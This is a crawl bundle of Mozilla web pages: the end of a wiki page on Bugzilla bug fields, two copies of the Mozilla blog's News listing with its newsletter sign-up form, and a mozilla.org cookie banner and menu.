Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from blog.mozilla.org_02ca07ef_20250126_115053.html ===

[Skip to content](#content)

[Mozilla](https://blog.mozilla.org/en/)

![search](https://blog.mozilla.org/wp-content/themes/foxtail/assets/images/icons/search.svg)

* [Internet Culture](https://blog.mozilla.org/en/category/internet-culture/)
  + [Deep Dives](https://blog.mozilla.org/en/category/internet-culture/deep-dives/)
  + [Mozilla Explains](https://blog.mozilla.org/en/category/internet-culture/mozilla-explains/)
  + [Interviews](https://blog.mozilla.org/en/category/internet-culture/interviews/)
  + [Videos](https://blog.mozilla.org/en/category/videos/)
* [Privacy & Security](https://blog.mozilla.org/en/category/privacy-security/)
* [Products](https://blog.mozilla.org/en/category/products/)
  + [Firefox](https://blog.mozilla.org/en/category/products/firefox/)
  + [Pocket](https://blog.mozilla.org/en/category/products/pocket/)
  + [Mozilla VPN](https://blog.mozilla.org/en/category/products/mozilla-vpn/)
* [Mozilla](https://blog.mozilla.org/en/category/mozilla/)
  + [News](https://blog.mozilla.org/en/category/mozilla/news/)
  + [Internet Policy](https://blog.mozilla.org/en/category/mozilla/internet-policy/)
  + [Leadership](https://blog.mozilla.org/en/category/mozilla/leadership/)
    - [Mitchell Baker, CEO](https://blog.mozilla.org/en/author/mitchellmozillacom/)
    - [Mark Surman, ED Foundation](https://blog.mozilla.org/en/author/markmozillafoundation-org/)
    - [Eric Rescorla, Firefox CTO](https://blog.mozilla.org/en/author/ekrmozilla-com/)

[Download Firefox](https://www.mozilla.org/firefox/new/?utm_source=blog.mozilla.org&utm_medium=referral&utm_campaign=blog-nav)

![search](https://blog.mozilla.org/wp-content/themes/foxtail/assets/images/icons/search.svg)

#### Search

Search for:

![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2019/01/mozilla-logo-bw-rgb.png)
## News

Official announcements and press releases

[![Room filled with people listening to a speaker on stage. Demo Day visual image in the background.](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/12/Demo_Day_Blog_Header_-1-800x800.jpg)
Mozilla
## Mozilla Builders: Celebrating community-driven innovation in AI

Read More](https://blog.mozilla.org/en/mozilla/mozilla-builders-demo-day/)

[![The Mozilla logo in green on a black background](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/12/logo-lockup-video-poster-800x800.png)
Mozilla
## Mozilla welcomes new executive team members

Read More](https://blog.mozilla.org/en/mozilla/new-executives/)

[![Decorative image of wrapped gifts in front of an iphone](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2023/11/moz_header_holiday_firefox-phone-gifts_blue-03.png-800x800.png)
Products
## Shopping for everyone? We’ve got you covered with the Fakespot Holiday Gift Guide 2024

Read More](https://blog.mozilla.org/en/products/shopping-for-everyone-weve-got-you-covered-with-the-fakespot-holiday-gift-guide-2024/)

[![Text: Mozilla Builders](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/Blog-16_9-1920x1080-1-800x800.png)
Mozilla
## 14 AI projects to watch: Mozilla’s first Builders Accelerator cohort kicks off

Read More](https://blog.mozilla.org/en/mozilla/14-ai-projects-to-watch-mozillas-first-builders-accelerator-cohort-kicks-off/)

[![A check mark next to the text "Fakespot."](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2023/07/Fakespot_ProductBlog-2-800x800.jpg)
News
## Fakespot’s guide to trending back-to-school products

Read More](https://blog.mozilla.org/en/mozilla/news/fakespots-guide-to-trending-back-to-school-products/)

[![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/IG_Highlights_Icon-800x800.png)
Mozilla
## BAFTA Award-Winner Siobhán McSweeney to host Mozilla’s 2nd Annual Rise25 Awards in Dublin, Ireland on Aug. 13

Read More](https://blog.mozilla.org/en/mozilla/bafta-award-winner-siobhan-mcsweeney-to-host-mozillas-2nd-annual-rise25-awards-in-dublin-ireland-on-august-13/)

[![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/05/fx_website_meta-image_tips-tricks_alt-04-1-800x800.webp)
Mozilla
## Here’s what we’re working on in Firefox

Read More](https://blog.mozilla.org/en/mozilla/heres-what-were-working-on-in-firefox/)

[![A check mark next to the text "Fakespot."](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2023/07/Fakespot_ProductBlog-2-800x800.jpg)
News
## Fakespot reveals the product categories with the most and least reliable product reviews

Read More](https://blog.mozilla.org/en/mozilla/news/fakespot-reveals-the-product-categories-with-the-most-and-least-reliable-product-reviews-for-summer-and-back-to-school-shopping/)

[![A dark blue speech bubble with horizontal purple and red bars on a pink background.](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2020/03/fx_blog_header_announcements_001_1920x1080-800x800.jpg)
Firefox
## Engaging with our Firefox community: Highlights from our recent AMA

Read More](https://blog.mozilla.org/en/products/firefox/engaging-with-our-firefox-community-highlights-from-our-recent-ama/)

[![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/IG_Highlights_Icon-800x800.png)
Mozilla
## Mozilla announces finalists for the 2nd annual Rise25 Awards

Read More](https://blog.mozilla.org/en/mozilla/mozilla-announces-finalists-for-the-2nd-annual-rise25-awards/)

[![Mozilla and Anonym logos](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/blog_1200x800_v2-800x800.png)
Mozilla
## Introducing Anonym: Raising the bar for privacy-preserving digital advertising

Read More](https://blog.mozilla.org/en/mozilla/mozilla-anonym-raising-the-bar-for-privacy-preserving-digital-advertising/)

[![logo - zero with a diagonal line through it, and the letters D, I, N](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/odintbanner-500x500.png)
Mozilla
## Keeping GenAI technologies secure is a shared responsibility

Read More](https://blog.mozilla.org/en/mozilla/keeping-genai-technologies-secure-is-a-shared-responsibility/)

1
[2](https://blog.mozilla.org/en/category/mozilla/news/page/2?utm_source=www.mozilla.o)
[3](https://blog.mozilla.org/en/category/mozilla/news/page/3?utm_source=www.mozilla.o)
…
[24](https://blog.mozilla.org/en/category/mozilla/news/page/24?utm_source=www.mozilla.o)
[next](https://blog.mozilla.org/en/category/mozilla/news/page/2?utm_source=www.mozilla.o)

![newsletter](https://blog.mozilla.org/wp-content/themes/foxtail/assets/images/newsletter.png)

### Keep up with all things Firefox

Get how-tos, advice and news to make your Firefox experience work best for you.

Your e-mail address

Country
- select -
Afghanistan
Akrotiri
Albania
Algeria
American Samoa
Andorra
Angola
Anguilla
Antarctica
Antigua and Barbuda
Argentina
Armenia
Aruba
Ashmore and Cartier Islands
Australia
Austria
Azerbaijan
Bahamas, The
Bahrain
Baker Island
Bangladesh
Barbados
Bassas da India
Belarus
Belgium
Belize
Benin
Bermuda
Bhutan
Bolivia
Bonaire, Sint Eustatius, and Saba
Bosnia and Herzegovina
Botswana
Bouvet Island
Brazil
British Indian Ocean Territory
Brunei
Bulgaria
Burkina Faso
Burma
Burundi
Cabo Verde
Cambodia
Cameroon
Canada
Cayman Islands
Central African Republic
Chad
Chile
China
Christmas Island
Clipperton Island
Cocos (Keeling) Islands
Colombia
Comoros
Congo (Brazzaville)
Congo (Kinshasa)
Cook Islands
Coral Sea Islands
Costa Rica
Croatia
Cuba
Curaçao
Cyprus
Czech Republic
Côte d’Ivoire
Denmark
Dhekelia
Diego Garcia
Djibouti
Dominica
Dominican Republic
Ecuador
Egypt
El Salvador
Equatorial Guinea
Eritrea
Estonia
Ethiopia
Europa Island
Falkland Islands (Islas Malvinas)
Faroe Islands
Fiji
Finland
France
French Guiana
French Polynesia
French Southern and Antarctic Lands
Gabon
Gambia, The
Gaza Strip
Georgia
Germany
Ghana
Gibraltar
Glorioso Islands
Greece
Greenland
Grenada
Guadeloupe
Guam
Guatemala
Guernsey
Guinea
Guinea-Bissau
Guyana
Haiti
Heard Island and McDonald Islands
Honduras
Hong Kong
Howland Island
Hungary
Iceland
India
Indonesia
Iran
Iraq
Ireland
Isle of Man
Israel
Italy
Jamaica
Jan Mayen
Japan
Jarvis Island
Jersey
Johnston Atoll
Jordan
Juan de Nova Island
Kazakhstan
Kenya
Kingman Reef
Kiribati
Korea, North
Korea, South
Kosovo
Kuwait
Kyrgyzstan
Laos
Latvia
Lebanon
Lesotho
Liberia
Libya
Liechtenstein
Lithuania
Luxembourg
Macau
Macedonia
Madagascar
Malawi
Malaysia
Maldives
Mali
Malta
Marshall Islands
Martinique
Mauritania
Mauritius
Mayotte
Mexico
Micronesia, Federated States of
Midway Islands
Moldova
Monaco
Mongolia
Montenegro
Montserrat
Morocco
Mozambique
Namibia
Nauru
Navassa Island
Nepal
Netherlands
New Caledonia
New Zealand
Nicaragua
Niger
Nigeria
Niue
Norfolk Island
Northern Mariana Islands
Norway
Oman
Pakistan
Palau
Palmyra Atoll
Panama
Papua New Guinea
Paracel Islands
Paraguay
Peru
Philippines
Pitcairn Islands
Poland
Portugal
Puerto Rico
Qatar
Reunion
Romania
Russia
Rwanda
Saint Barthelemy
Saint Helena, Ascension, and Tristan da Cunha
Saint Kitts and Nevis
Saint Lucia
Saint Martin
Saint Pierre and Miquelon
Saint Vincent and the Grenadines
Samoa
San Marino
Sao Tome and Principe
Saudi Arabia
Senegal
Serbia
Seychelles
Sierra Leone
Singapore
Sint Maarten
Slovakia
Slovenia
Solomon Islands
Somalia
South Africa
South Georgia and South Sandwich Islands
South Sudan
Spain
Spratly Islands
Sri Lanka
Sudan
Suriname
Svalbard
Swaziland
Sweden
Switzerland
Syria
Taiwan
Tajikistan
Tanzania
Thailand
Timor-Leste
Togo
Tokelau
Tonga
Trinidad and Tobago
Tromelin Island
Tunisia
Turkey
Turkmenistan
Turks and Caicos Islands
Tuvalu
Uganda
Ukraine
United Arab Emirates
United Kingdom
United States
Uruguay
Uzbekistan
Vanuatu
Vatican City
Venezuela
Vietnam
Virgin Islands, British
Virgin Islands, U.S.
Wake Island
Wallis and Futuna
West Bank
Western Sahara
Yemen
Zambia
Zimbabwe

Language
English
Bahasa Indonesia
Deutsch
Español
Français
Polski
Português
Русский
正體中文

Format

 HTML

 Text

I’m okay with Mozilla handling my info as explained in this [Privacy Policy](https://www.mozilla.org/privacy/).

Sign up now
We will only send you
Mozilla-related information.

## Thanks!

If you haven’t previously confirmed a subscription to a Mozilla-related newsletter you may have to do so. Please check your inbox or your spam filter for an e-mail from us.

[Mozilla](https://www.mozilla.org/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Mozilla

* [About](https://www.mozilla.org/about/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Contact Us](https://www.mozilla.org/contact/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Donate](https://donate.mozilla.org/?presets=50,30,20,10&amount=30¤cy=usd&utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Firefox

* [Download Firefox](https://www.mozilla.org/firefox/new/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Desktop](https://www.mozilla.org/firefox/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Mobile](https://www.mozilla.org/firefox/mobile/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Features](https://www.mozilla.org/firefox/features/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Beta, Nightly, Developer Edition](https://www.mozilla.org/firefox/channel/desktop/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Resources

* [Privacy Hub](https://www.mozilla.org/privacy/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Browser Comparison](https://www.mozilla.org/firefox/browsers/compare/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Brand Standards](https://mozilla.design/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Social

Follow @Firefox

* [Twitter (@mozilla)](https://twitter.com/firefox)
* [Instagram (@mozilla)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)

Follow @Mozilla

* [Twitter (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)

* [Website Privacy Notice](https://www.mozilla.org/privacy/websites/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Legal](https://www.mozilla.org/about/legal/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)



=== Content from blog.mozilla.org_0753cb36_20250126_115054.html ===

[Skip to content](#content)

[Mozilla](https://blog.mozilla.org/en/)

![search](https://blog.mozilla.org/wp-content/themes/foxtail/assets/images/icons/search.svg)

* [Internet Culture](https://blog.mozilla.org/en/category/internet-culture/)
  + [Deep Dives](https://blog.mozilla.org/en/category/internet-culture/deep-dives/)
  + [Mozilla Explains](https://blog.mozilla.org/en/category/internet-culture/mozilla-explains/)
  + [Interviews](https://blog.mozilla.org/en/category/internet-culture/interviews/)
  + [Videos](https://blog.mozilla.org/en/category/videos/)
* [Privacy & Security](https://blog.mozilla.org/en/category/privacy-security/)
* [Products](https://blog.mozilla.org/en/category/products/)
  + [Firefox](https://blog.mozilla.org/en/category/products/firefox/)
  + [Pocket](https://blog.mozilla.org/en/category/products/pocket/)
  + [Mozilla VPN](https://blog.mozilla.org/en/category/products/mozilla-vpn/)
* [Mozilla](https://blog.mozilla.org/en/category/mozilla/)
  + [News](https://blog.mozilla.org/en/category/mozilla/news/)
  + [Internet Policy](https://blog.mozilla.org/en/category/mozilla/internet-policy/)
  + [Leadership](https://blog.mozilla.org/en/category/mozilla/leadership/)
    - [Mitchell Baker, CEO](https://blog.mozilla.org/en/author/mitchellmozillacom/)
    - [Mark Surman, ED Foundation](https://blog.mozilla.org/en/author/markmozillafoundation-org/)
    - [Eric Rescorla, Firefox CTO](https://blog.mozilla.org/en/author/ekrmozilla-com/)

[Download Firefox](https://www.mozilla.org/firefox/new/?utm_source=blog.mozilla.org&utm_medium=referral&utm_campaign=blog-nav)

![search](https://blog.mozilla.org/wp-content/themes/foxtail/assets/images/icons/search.svg)

#### Search

Search for:

![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2019/01/mozilla-logo-bw-rgb.png)
## News

Official announcements and press releases

[![Room filled with people listening to a speaker on stage. Demo Day visual image in the background.](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/12/Demo_Day_Blog_Header_-1-800x800.jpg)
Mozilla
## Mozilla Builders: Celebrating community-driven innovation in AI

Read More](https://blog.mozilla.org/en/mozilla/mozilla-builders-demo-day/)

[![The Mozilla logo in green on a black background](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/12/logo-lockup-video-poster-800x800.png)
Mozilla
## Mozilla welcomes new executive team members

Read More](https://blog.mozilla.org/en/mozilla/new-executives/)

[![Decorative image of wrapped gifts in front of an iphone](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2023/11/moz_header_holiday_firefox-phone-gifts_blue-03.png-800x800.png)
Products
## Shopping for everyone? We’ve got you covered with the Fakespot Holiday Gift Guide 2024

Read More](https://blog.mozilla.org/en/products/shopping-for-everyone-weve-got-you-covered-with-the-fakespot-holiday-gift-guide-2024/)

[![Text: Mozilla Builders](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/Blog-16_9-1920x1080-1-800x800.png)
Mozilla
## 14 AI projects to watch: Mozilla’s first Builders Accelerator cohort kicks off

Read More](https://blog.mozilla.org/en/mozilla/14-ai-projects-to-watch-mozillas-first-builders-accelerator-cohort-kicks-off/)

[![A check mark next to the text "Fakespot."](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2023/07/Fakespot_ProductBlog-2-800x800.jpg)
News
## Fakespot’s guide to trending back-to-school products

Read More](https://blog.mozilla.org/en/mozilla/news/fakespots-guide-to-trending-back-to-school-products/)

[![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/IG_Highlights_Icon-800x800.png)
Mozilla
## BAFTA Award-Winner Siobhán McSweeney to host Mozilla’s 2nd Annual Rise25 Awards in Dublin, Ireland on Aug. 13

Read More](https://blog.mozilla.org/en/mozilla/bafta-award-winner-siobhan-mcsweeney-to-host-mozillas-2nd-annual-rise25-awards-in-dublin-ireland-on-august-13/)

[![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/05/fx_website_meta-image_tips-tricks_alt-04-1-800x800.webp)
Mozilla
## Here’s what we’re working on in Firefox

Read More](https://blog.mozilla.org/en/mozilla/heres-what-were-working-on-in-firefox/)

[![A check mark next to the text "Fakespot."](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2023/07/Fakespot_ProductBlog-2-800x800.jpg)
News
## Fakespot reveals the product categories with the most and least reliable product reviews

Read More](https://blog.mozilla.org/en/mozilla/news/fakespot-reveals-the-product-categories-with-the-most-and-least-reliable-product-reviews-for-summer-and-back-to-school-shopping/)

[![A dark blue speech bubble with horizontal purple and red bars on a pink background.](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2020/03/fx_blog_header_announcements_001_1920x1080-800x800.jpg)
Firefox
## Engaging with our Firefox community: Highlights from our recent AMA

Read More](https://blog.mozilla.org/en/products/firefox/engaging-with-our-firefox-community-highlights-from-our-recent-ama/)

[![](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/IG_Highlights_Icon-800x800.png)
Mozilla
## Mozilla announces finalists for the 2nd annual Rise25 Awards

Read More](https://blog.mozilla.org/en/mozilla/mozilla-announces-finalists-for-the-2nd-annual-rise25-awards/)

[![Mozilla and Anonym logos](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/blog_1200x800_v2-800x800.png)
Mozilla
## Introducing Anonym: Raising the bar for privacy-preserving digital advertising

Read More](https://blog.mozilla.org/en/mozilla/mozilla-anonym-raising-the-bar-for-privacy-preserving-digital-advertising/)

[![logo - zero with a diagonal line through it, and the letters D, I, N](https://blog.mozilla.org/wp-content/blogs.dir/278/files/2024/06/odintbanner-500x500.png)
Mozilla
## Keeping GenAI technologies secure is a shared responsibility

Read More](https://blog.mozilla.org/en/mozilla/keeping-genai-technologies-secure-is-a-shared-responsibility/)

1
[2](https://blog.mozilla.org/en/category/mozilla/news/page/2?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=compan)
[3](https://blog.mozilla.org/en/category/mozilla/news/page/3?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=compan)
…
[24](https://blog.mozilla.org/en/category/mozilla/news/page/24?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=compan)
[next](https://blog.mozilla.org/en/category/mozilla/news/page/2?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=compan)

![newsletter](https://blog.mozilla.org/wp-content/themes/foxtail/assets/images/newsletter.png)

### Keep up with all things Firefox

Get how-tos, advice and news to make your Firefox experience work best for you.

Your e-mail address

Country
- select -
Afghanistan
Akrotiri
Albania
Algeria
American Samoa
Andorra
Angola
Anguilla
Antarctica
Antigua and Barbuda
Argentina
Armenia
Aruba
Ashmore and Cartier Islands
Australia
Austria
Azerbaijan
Bahamas, The
Bahrain
Baker Island
Bangladesh
Barbados
Bassas da India
Belarus
Belgium
Belize
Benin
Bermuda
Bhutan
Bolivia
Bonaire, Sint Eustatius, and Saba
Bosnia and Herzegovina
Botswana
Bouvet Island
Brazil
British Indian Ocean Territory
Brunei
Bulgaria
Burkina Faso
Burma
Burundi
Cabo Verde
Cambodia
Cameroon
Canada
Cayman Islands
Central African Republic
Chad
Chile
China
Christmas Island
Clipperton Island
Cocos (Keeling) Islands
Colombia
Comoros
Congo (Brazzaville)
Congo (Kinshasa)
Cook Islands
Coral Sea Islands
Costa Rica
Croatia
Cuba
Curaçao
Cyprus
Czech Republic
Côte d’Ivoire
Denmark
Dhekelia
Diego Garcia
Djibouti
Dominica
Dominican Republic
Ecuador
Egypt
El Salvador
Equatorial Guinea
Eritrea
Estonia
Ethiopia
Europa Island
Falkland Islands (Islas Malvinas)
Faroe Islands
Fiji
Finland
France
French Guiana
French Polynesia
French Southern and Antarctic Lands
Gabon
Gambia, The
Gaza Strip
Georgia
Germany
Ghana
Gibraltar
Glorioso Islands
Greece
Greenland
Grenada
Guadeloupe
Guam
Guatemala
Guernsey
Guinea
Guinea-Bissau
Guyana
Haiti
Heard Island and McDonald Islands
Honduras
Hong Kong
Howland Island
Hungary
Iceland
India
Indonesia
Iran
Iraq
Ireland
Isle of Man
Israel
Italy
Jamaica
Jan Mayen
Japan
Jarvis Island
Jersey
Johnston Atoll
Jordan
Juan de Nova Island
Kazakhstan
Kenya
Kingman Reef
Kiribati
Korea, North
Korea, South
Kosovo
Kuwait
Kyrgyzstan
Laos
Latvia
Lebanon
Lesotho
Liberia
Libya
Liechtenstein
Lithuania
Luxembourg
Macau
Macedonia
Madagascar
Malawi
Malaysia
Maldives
Mali
Malta
Marshall Islands
Martinique
Mauritania
Mauritius
Mayotte
Mexico
Micronesia, Federated States of
Midway Islands
Moldova
Monaco
Mongolia
Montenegro
Montserrat
Morocco
Mozambique
Namibia
Nauru
Navassa Island
Nepal
Netherlands
New Caledonia
New Zealand
Nicaragua
Niger
Nigeria
Niue
Norfolk Island
Northern Mariana Islands
Norway
Oman
Pakistan
Palau
Palmyra Atoll
Panama
Papua New Guinea
Paracel Islands
Paraguay
Peru
Philippines
Pitcairn Islands
Poland
Portugal
Puerto Rico
Qatar
Reunion
Romania
Russia
Rwanda
Saint Barthelemy
Saint Helena, Ascension, and Tristan da Cunha
Saint Kitts and Nevis
Saint Lucia
Saint Martin
Saint Pierre and Miquelon
Saint Vincent and the Grenadines
Samoa
San Marino
Sao Tome and Principe
Saudi Arabia
Senegal
Serbia
Seychelles
Sierra Leone
Singapore
Sint Maarten
Slovakia
Slovenia
Solomon Islands
Somalia
South Africa
South Georgia and South Sandwich Islands
South Sudan
Spain
Spratly Islands
Sri Lanka
Sudan
Suriname
Svalbard
Swaziland
Sweden
Switzerland
Syria
Taiwan
Tajikistan
Tanzania
Thailand
Timor-Leste
Togo
Tokelau
Tonga
Trinidad and Tobago
Tromelin Island
Tunisia
Turkey
Turkmenistan
Turks and Caicos Islands
Tuvalu
Uganda
Ukraine
United Arab Emirates
United Kingdom
United States
Uruguay
Uzbekistan
Vanuatu
Vatican City
Venezuela
Vietnam
Virgin Islands, British
Virgin Islands, U.S.
Wake Island
Wallis and Futuna
West Bank
Western Sahara
Yemen
Zambia
Zimbabwe

Language
English
Bahasa Indonesia
Deutsch
Español
Français
Polski
Português
Русский
正體中文

Format

 HTML

 Text

I’m okay with Mozilla handling my info as explained in this [Privacy Policy](https://www.mozilla.org/privacy/).

Sign up now
We will only send you
Mozilla-related information.

## Thanks!

If you haven’t previously confirmed a subscription to a Mozilla-related newsletter you may have to do so. Please check your inbox or your spam filter for an e-mail from us.

[Mozilla](https://www.mozilla.org/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Mozilla

* [About](https://www.mozilla.org/about/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Contact Us](https://www.mozilla.org/contact/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Donate](https://donate.mozilla.org/?presets=50,30,20,10&amount=30¤cy=usd&utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Firefox

* [Download Firefox](https://www.mozilla.org/firefox/new/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Desktop](https://www.mozilla.org/firefox/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Mobile](https://www.mozilla.org/firefox/mobile/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Features](https://www.mozilla.org/firefox/features/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Beta, Nightly, Developer Edition](https://www.mozilla.org/firefox/channel/desktop/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Resources

* [Privacy Hub](https://www.mozilla.org/privacy/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Browser Comparison](https://www.mozilla.org/firefox/browsers/compare/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Brand Standards](https://mozilla.design/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)

##### Social

Follow @Firefox

* [Twitter (@mozilla)](https://twitter.com/firefox)
* [Instagram (@mozilla)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)

Follow @Mozilla

* [Twitter (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)

* [Website Privacy Notice](https://www.mozilla.org/privacy/websites/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)
* [Legal](https://www.mozilla.org/about/legal/?utm_source=blog.mozilla.org&utm_campaign=footer&utm_medium=referral)



=== Content from code.google.com_80776903_20250125_204647.html ===



=== Content from www.mozilla.org_d8370efd_20250125_204650.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
